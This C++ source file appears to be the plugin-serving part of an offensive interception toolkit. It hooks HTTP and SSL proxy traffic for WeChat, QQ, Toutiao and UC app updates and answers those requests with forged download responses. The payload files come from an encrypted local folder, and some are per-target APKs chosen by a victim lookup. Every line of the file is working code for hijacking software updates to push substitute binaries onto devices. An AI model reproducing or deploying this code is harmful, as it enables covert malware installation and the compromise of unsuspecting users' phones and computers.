#include <windows.h>
#include <winsock2.h>
#include <exception>
#include "sslPublic.h"
#include "PluginServer.h"
#include <iostream>
#include "WeixinAndroid.h"
#include "WeixinPC.h"
#include "../HttpUtils.h"
#include "Toutiao.h"
#include "QQmtt.h"
#include "../Public.h"
#include "../attacker.h"
#include "../FileOper.h"
#include "InformerClient.h"
#include "../HttpPartial.h"
#include "qq.h"
#include "SSLAttack.h"

using namespace std;

int PluginServer::PluginServerProc(LPSSLPROXYPARAM lpparam, char * recvbuf, int recvlen) {

	int ret = 0;

	*(recvbuf + recvlen) = 0;

	char * httpdata = 0;

	string httphdr = HttpUtils::getHttpHeader(recvbuf, recvlen,&httpdata);

	string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());

	string destfn = HttpUtils::getUrl(recvbuf, recvlen);

	string strip = HttpUtils::getIPstr(lpparam->saToClient.sin_addr.S_un.S_addr);

	//string host = HttpUtils::getValueFromKey(httphdr.c_str(), "Host");

	string datetime = Public::getDateTime();

	char szout[2048] = { 0 };
	int outlen = wsprintfA(szout, "PluginServerProc ssl recv url:%s,ip:%s,time:%s\r\n", url.c_str(), strip.c_str(), datetime.c_str());
	Public::WriteLogFile(szout);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);

	int flag = 1;
	if (memcmp(recvbuf, "HEAD ", 5) == 0)
	{
		flag = 0;
	}

	int begin = 0;
	int end = 0;
	ret = HttpUtils::getRange(httphdr.c_str(), begin, end);
	if (ret == 0)
	{
		printf("range start:%d,end:%d,file:%s\r\n", begin, end, destfn.c_str());

		char * contentTypeFormat = getPartialContentType(destfn);

		ret = SendPluginFile(destfn.c_str(), lpparam, contentTypeFormat, begin, end,flag);
	}
	else {
		char * contentTypeFormat = getContentType(destfn);
		ret = SendPluginFile(destfn.c_str(), lpparam, contentTypeFormat,flag);
	}

	return TRUE;
}



int PluginServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM lpparam, const char * szHttpRespHdrFormat, int start, int end, int flag) {
	int ret = 0;
	char szout[2048];

	string filename = "";
	if (lpfn[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
	}
	else {
		filename = Public::getPluginPath() + string(lpfn);
	}


	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}
	
	if (end == 0 || end == -1)
	{
		end = start + filesize - 1;
	}
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (start >= filesize  || start < 0 || end <= 0 || end >= filesize)	
	{
		delete[] lpdata;
		wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(),start,end);
		Public::WriteLogFile(szout);
		return FALSE;
	}
	int sendsize = end + 1 - start;

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, szHttpRespHdrFormat, start, end, filesize, sendsize);

	ret = SSL_write(lpparam->SSLToClient, szDataRespHdr, iDataRespHdrLen);

	Public::WriteLogFile(ATTACK_LOG_FILENAME,szDataRespHdr,iDataRespHdrLen);

	if (flag == 0)
	{
		delete[] lpdata;
		return TRUE;
	}

	int modulesize = SSL_MAX_BLOCK_SIZE;
	int sendtimes = sendsize / modulesize;
	int sendmod = sendsize % modulesize;
	int i = 0;
	for (i = 0; i < sendtimes; i++)
	{
		ret = SSL_write(lpparam->SSLToClient, lpdata + start + i*modulesize, modulesize);
		if (ret <= 0)
		{
			int sslerror = SSL_get_error(lpparam->SSLToClient, ret);
			break;
		}
	}

	if (sendmod)
	{
		ret = SSL_write(lpparam->SSLToClient, lpdata + start + i*modulesize, sendmod);
		if (ret <= 0)
		{
			int sslerror = SSL_get_error(lpparam->SSLToClient, ret);
		}
	}

	delete[] lpdata;
	if (ret <= 0)
	{
		int len =wsprintfA(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout,len);
		return FALSE;
	}
	else {
		int len = wsprintfA(szout, "send data packet:%s from:%u to:%u ok\r\n", filename.c_str(),start, sendsize);
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
		return TRUE;
	}
}








int PluginServer::SendPluginFile(const char * lpfn,LPSSLPROXYPARAM lpparam,const char * szHttpRespHdrFormat, int flag) {

	int ret = 0;
	char szout[2048];
	string filename = "";
	if (lpfn[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
	}
	else {
		filename = Public::getPluginPath() + string(lpfn);
	}


	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= FALSE )
	{
		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, szHttpRespHdrFormat, filesize);

	ret = SSL_write(lpparam->SSLToClient, szDataRespHdr, iDataRespHdrLen);

	Public::WriteLogFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);

	if (flag == 0)
	{
		delete[] lpdata;
		return TRUE;
	}

	int modulesize = SSL_MAX_BLOCK_SIZE;
	int sendtimes = filesize / modulesize;
	int sendmod = filesize % modulesize;
	int i = 0;
	for ( i = 0; i < sendtimes; i ++)
	{
		ret = SSL_write(lpparam->SSLToClient, lpdata + i*modulesize, modulesize);
		if (ret <= 0)
		{
			int sslerror = SSL_get_error(lpparam->SSLToClient, ret);
			break;
		}
	}

	if (sendmod)
	{
		ret = SSL_write(lpparam->SSLToClient, lpdata + i*modulesize, sendmod);
		if (ret <= 0)
		{
			int sslerror = SSL_get_error(lpparam->SSLToClient, ret);
		}
	}

	delete[] lpdata;
	if (ret <= 0)
	{
		int len = sprintf(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
		return FALSE;
	}
	else {
		int len = sprintf(szout, "send data packet:%s ok\r\n", filename.c_str());
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
		return TRUE;
	}
}



int PluginServer::PluginServerProc(LPHTTPPROXYPARAM lpparam,char * recvbuf,int recvlen) {

	int ret = 0;

	*(recvbuf + recvlen) = 0;
	char * httpdata = 0;

	string httphdr = HttpUtils::getHttpHeader(recvbuf, recvlen,&httpdata);
	string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());

	string destfn = HttpUtils::getUrl(recvbuf, recvlen);

	string host = HttpUtils::getValueFromKey(httphdr.c_str(), "Host");

	string strip = HttpUtils::getIPstr(lpparam->saToClient.sin_addr.S_un.S_addr);

	string datetime = Public::getDateTime();

	char szout[2048] = { 0 };
	int outlen = wsprintfA(szout, "PluginServerProc http recv url:%s,ip:%s,time:%s\r\n", url.c_str(), strip.c_str(), datetime.c_str());
	Public::WriteLogFile(szout);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);

	int flag = 1;
	if (memcmp(recvbuf,"HEAD ",5) == 0)
	{
		flag = 0;
	}
	
	if (strstr(destfn.c_str(),WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME))
	{
		char * szHttpRespHdrAppFormat = 
	"HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nAccept-Ranges: none\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
		ret = SendPluginFile(destfn.c_str(), lpparam, szHttpRespHdrAppFormat, flag);	//must be application/octet-stream
		return 0;
	}
	else if (strstr(destfn.c_str(), QQMINIBROWSER_FILE_NAME))
	{
		char * szHttpRespHdrAppFormat = 
	"HTTP/1.1 200 OK\r\nAccept-Ranges: none\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
		ret = SendPluginFile(destfn.c_str(), lpparam, szHttpRespHdrAppFormat, flag);	//must be application/octet-stream
		return 0;
	}else if (strstr(destfn.c_str(), SIMCARD_APK_FILENAME))
	{
		string username = InformerClient::getTarget(lpparam->saToClient.sin_addr.S_un.S_addr, host.c_str());

		lstrcpyA(lpparam->username, username.c_str());

		string fileurl = string("/") + username + "/" + SIMCARD_APK_FILENAME;

		char * szHttpRespHdrAppFormat = 
	"HTTP/1.1 200 OK\r\nAccept-Ranges: none\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
		ret = SendPluginFile(fileurl.c_str(), lpparam, szHttpRespHdrAppFormat, flag);
		return 0;
	}


	int begin = 0;
	int end = 0;
	ret = HttpUtils::getRange(httphdr.c_str(), begin, end);
	if (ret == 0)
	{
		char * contentTypeFormat = getPartialContentType(destfn);
		printf("range start:%d,end:%d,file:%s\r\n", begin, end, destfn.c_str());
		ret = SendPluginFile(destfn.c_str(), lpparam, contentTypeFormat, begin, end,flag);
	}
	else {
		char * contentTypeFormat = getContentType(destfn);
		ret = SendPluginFile(destfn.c_str(), lpparam, contentTypeFormat,flag);
	}

	return TRUE;
}


//fopen "rb" can open one file more times
//CreateFile FILE_SHARE_READ|FILE_SHARE_WRITE
int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, const char * szHttpRespHdrFormat, int start, int end, int flag) {
	int ret = 0;
	char szout[2048];
	
	if (strstr(lpfn, UCPPAPPSTORE_UPDATE_FILENAME) || strstr(lpfn, UCGAME_UPDATE_FILENAME) || strstr(lpfn, UCALOPHA_UPDATE_FILENAME) || 
		/*strstr(lpfn, UCGAMERTA_UPDATE_FILENAME) ||*/ strstr(lpfn, UCAMAP_UPDATE_FILENAME) /* || strstr(lpfn, UCLIVE_UPDATE_FILENAME)*/)
	{
		ret = HttpPartial::sendPartFileWithoutHdr(lpfn, lpparam->sockToClient, start, end);
		return ret;
	}

	string filename;
	if (lpfn[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
	}
	else {
		filename = Public::getPluginPath() + string(lpfn);
	}

	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= FALSE)
	{
		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}

	if (end == 0 || end == -1)
	{
		end = start + filesize - 1;
	}
	
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (start >= filesize || start < 0 || end < 0 || end >= filesize)
	{
		delete[] lpdata;
		int outlen = wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(), start, end);
		Public::WriteLogFile(szout);
		return FALSE;
	}
	int sendsize = end + 1 - start;

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, szHttpRespHdrFormat, start, end, filesize, sendsize);

	ret = send(lpparam->sockToClient, szDataRespHdr, iDataRespHdrLen, 0);

	Public::WriteLogFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);

	if (flag == 0)
	{
		delete[] lpdata;
		return TRUE;
	}

	ret = send(lpparam->sockToClient, lpdata + start, sendsize, 0);

	delete[] lpdata;
	if (ret <= 0)
	{
		int len = sprintf(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
		return FALSE;
	}
	else {
		int len = sprintf(szout, "send data packet:%s from:%u,to:%u ok\r\n", filename.c_str(),start,sendsize);
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
		return TRUE;
	}
}


int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, char * szHttpRespHdrFormat, int flag) {
	char szout[2048];

	string filename;
	if (lpfn[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
	}
	else {
		filename = Public::getPluginPath() + string(lpfn);
	}
	
	int ret = 0;
	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= FALSE)
	{
		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, szHttpRespHdrFormat, filesize);
	ret = send(lpparam->sockToClient, szDataRespHdr, iDataRespHdrLen, 0);

	Public::WriteLogFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);

	if (flag == 0)
	{
		delete[] lpdata;
		return TRUE;
	}

	ret = send(lpparam->sockToClient, lpdata, filesize, 0);
	delete[] lpdata;
	if (ret <= 0)
	{
		int len = sprintf(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
		return FALSE;
	}
	else {
		int len = sprintf(szout, "send data packet:%s ok\r\n", filename.c_str());
		printf(szout);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
		return TRUE;
	}
}



char * PluginServer::getContentType(string url) {

	char * szHttpRespHdrApkFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrZipFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrJsonFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: text/json\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrAnyFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: */*\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrXmlFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: text/xml\r\nContent-Length: %u\r\n\r\n";

	char *httpTypeFormat = 0;

	if (strstr(url.c_str(), ".apk") || strstr(url.c_str(), ".jar"))
	{
		httpTypeFormat = szHttpRespHdrApkFormat;
	}
	else if (strstr(url.c_str(), ".exe") || strstr(url.c_str(), ".dll") || strstr(url.c_str(), ".lib") || strstr(url.c_str(), ".so"))
	{
		httpTypeFormat = szHttpRespHdrAppFormat;
	}
	else if (strstr(url.c_str(), ".zip"))
	{
		httpTypeFormat = szHttpRespHdrZipFormat;
	}
	else if (strstr(url.c_str(),".json") || strstr(url.c_str(), ".txt"))
	{
		httpTypeFormat = szHttpRespHdrJsonFormat;
	}
	else if (strstr(url.c_str(), ".xml"))
	{
		httpTypeFormat = szHttpRespHdrXmlFormat;
	}
	else {
		httpTypeFormat = szHttpRespHdrZipFormat;

	}

	return httpTypeFormat;
}


char * PluginServer::getPartialContentType(string url) {
	char * szHttpPartialZipFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/zip\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialApkFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/vnd.android.package-archive\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialAppFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialJsFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: text/json\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialXmlFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: text/xml\r\n"
		"Content-Length: %u\r\n\r\n";

	char *httpPartailFormat = 0;

	if (strstr(url.c_str(), ".apk") || strstr(url.c_str(), ".jar"))
	{
		httpPartailFormat = szHttpPartialApkFormat;
	}
	else if (strstr(url.c_str(), ".exe") || strstr(url.c_str(), ".dll") || strstr(url.c_str(), ".so") || strstr(url.c_str(), ".lib"))
	{
		httpPartailFormat = szHttpPartialAppFormat;
	}
	else if (strstr(url.c_str(), ".zip"))
	{
		httpPartailFormat = szHttpPartialZipFormat;
	}
	else if (strstr(url.c_str(),".json")|| strstr(url.c_str(), ".txt"))
	{
		httpPartailFormat = szHttpPartialJsFormat;
	}
	else if (strstr(url.c_str(), ".xml"))
	{
		httpPartailFormat = szHttpPartialXmlFormat;
	}
	else
	{
		httpPartailFormat = szHttpPartialZipFormat;
	}

	return httpPartailFormat;
}